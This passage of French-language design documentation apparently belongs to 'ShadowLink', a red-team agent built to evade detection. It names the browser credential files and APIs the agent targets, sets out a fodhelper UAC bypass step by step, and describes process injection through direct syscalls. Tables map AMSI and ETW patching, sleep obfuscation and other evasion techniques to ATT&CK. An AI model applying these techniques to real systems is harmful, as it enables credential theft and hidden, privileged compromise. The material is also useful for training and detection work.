│  • Firefox: %APPDATA%\Mozilla\Firefox\Profiles\               │
│    - logins.json, key4.db                                     │
│  • Edge: %LOCALAPPDATA%\Microsoft\Edge\User Data\Default      │
│                                                                │
│  Credential Manager:                                          │
│  • CredEnumerate() - Énumère les credentials stockés          │
│  • Windows Vault - Mots de passe Windows                      │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

#### 3. Privilege Escalation (Phase 10)

**UAC Bypass via fodhelper.exe** :

```
┌────────────────────────────────────────────────────────────────┐
│                UAC BYPASS - FODHELPER                          │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  fodhelper.exe est un binaire Microsoft avec "auto-elevate"   │
│  Il lit une clé registry pour savoir quelle commande exécuter │
│                                                                │
│  Technique:                                                   │
│  1. Créer: HKCU\Software\Classes\ms-settings\shell\open\command│
│     → Valeur: "C:\path\to\agent.exe"                          │
│     → DelegateExecute: "" (vide)                              │
│                                                                │
│  2. Exécuter fodhelper.exe (normalement)                      │
│                                                                │
│  3. fodhelper lit la registry et lance notre commande         │
│     → AVEC privilèges élevés (HIGH integrity)                 │
│     → SANS popup UAC !                                        │
│                                                                │
│  4. Cleanup: supprimer la clé registry                        │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

#### 4. Process Injection (Phase 9b)

**Problème** : L'agent en tant que processus séparé peut être détecté et tué.

**Solution** : Migrer le code dans un processus légitime (explorer.exe, svchost.exe).

```
┌────────────────────────────────────────────────────────────────┐
│                  PROCESS INJECTION                             │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  Méthode classique:                                           │
│  1. OpenProcess(target_pid) - Obtenir handle sur le process   │
│  2. VirtualAllocEx() - Allouer mémoire dans le process cible  │
│  3. WriteProcessMemory() - Écrire le shellcode                │
│  4. CreateRemoteThread() - Exécuter le shellcode              │
│                                                                │
│  Avec Direct Syscalls (évasion EDR):                          │
│  1. NtOpenProcess()                                           │
│  2. NtAllocateVirtualMemory()                                 │
│  3. NtWriteVirtualMemory()                                    │
│  4. NtCreateThreadEx()                                        │
│                                                                │
│  Résultat: Le code s'exécute dans explorer.exe ou svchost.exe │
│  L'analyste voit un processus légitime, pas l'agent !         │
└────────────────────────────────────────────────────────────────┘
```

---

## 📊 Résumé des Contournements

### Tableau de synthèse

| Mesure de Sécurité | Problème pour l'attaquant | Technique de Contournement | Fichier ShadowLink |
|-------------------|--------------------------|---------------------------|-------------------|
| **Signature AV** | Binaire détecté | XOR encryption, API hashing | `agent.c` |
| **Firewall** | Port 4444 bloqué | HTTPS port 443 | `https_transport.c` |
| **IDS/IPS** | Pattern de trafic détecté | Endpoints REST déguisés | `server_https.py` |
| **EDR Hooks** | Appels API interceptés | Direct Syscalls Hell's Gate | `syscalls.c` |
| **AMSI** | Scripts PowerShell bloqués | Patch AmsiScanBuffer | `agent.c` |
| **ETW** | Événements loggés | Patch EtwEventWrite | `agent.c` |
| **Memory Scanner** | Code détecté en mémoire | Sleep Obfuscation Ekko | `sleep_obfuscation.c` |
| **Sandbox** | Comportement analysé | Anti-VM/Anti-Debug | `agent.c` |
| **Process List** | Processus suspect visible | PEB Masquerading | `agent.c` |
| **UAC** | Privilèges limités | fodhelper bypass | `agent.c` |
| **Analyse fichier** | PE écrit sur disque | Reflective Loading (fileless) | `stager.c` |

### Schéma récapitulatif

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    SHADOWLINK - ÉVASION COMPLÈTE                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   COMPILATION               LIVRAISON               EXÉCUTION              │
│   ──────────               ─────────               ─────────              │
│   • XOR strings            • HTTPS/443             • Reflective Load       │
│   • API hashing            • REST endpoints        • Direct Syscalls       │
│   • Stager 48KB            • Double crypto         • AMSI/ETW bypass       │
│                            • TLS + AES             • NTDLL unhook          │
│                                                                             │
│   PERSISTANCE              C2 RUNTIME              ACTIONS                 │
│   ───────────              ──────────              ───────                 │
│   • Registry Run           • Sleep Obfuscation    • Credential dump       │
│   • Nom légitime           • Jitter beacon        • Process injection     │
│   • Chemin discret         • Anti-debug/VM        • UAC bypass            │
│                            • PEB masquerading     • BYOVD                 │
│                                                                             │
│   Résultat: Agent furtif résistant aux EDR, AV et analyses manuelles      │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📚 Références MITRE ATT&CK

| ID | Technique | Implémentation ShadowLink |
|----|-----------|--------------------------|
| T1027 | Obfuscated Files or Information | XOR string encryption |
| T1055 | Process Injection | Classic injection, migrate |
| T1055.012 | Process Hollowing | Reflective PE loading |
| T1071.001 | Application Layer Protocol: Web | HTTPS C2 |
| T1106 | Native API | Direct syscalls Hell's Gate |
| T1134 | Access Token Manipulation | Token impersonation |
| T1497 | Virtualization/Sandbox Evasion | Anti-VM, Anti-sandbox |
| T1547.001 | Registry Run Keys | WindowsSecurityHealth persistence |
| T1548.002 | Bypass User Account Control | fodhelper, eventvwr |
| T1562.001 | Disable or Modify Tools | AMSI/ETW bypass |
| T1573.001 | Encrypted Channel: Symmetric | AES-256-CBC |
| T1620 | Reflective Code Loading | Stager reflective loader |

---

## ⚠️ Avertissement

Ce document est fourni à des fins **éducatives uniquement**. Il vise à :
- Comprendre les techniques d'attaque pour mieux s'en défendre
- Former les équipes de sécurité (Red Team / Blue Team)
- Développer de meilleures solutions de détection

L'utilisation de ces techniques contre des systèmes sans autorisation est **illégale**.

---

*Document généré le 10 janvier 2026 - ShadowLink Project*
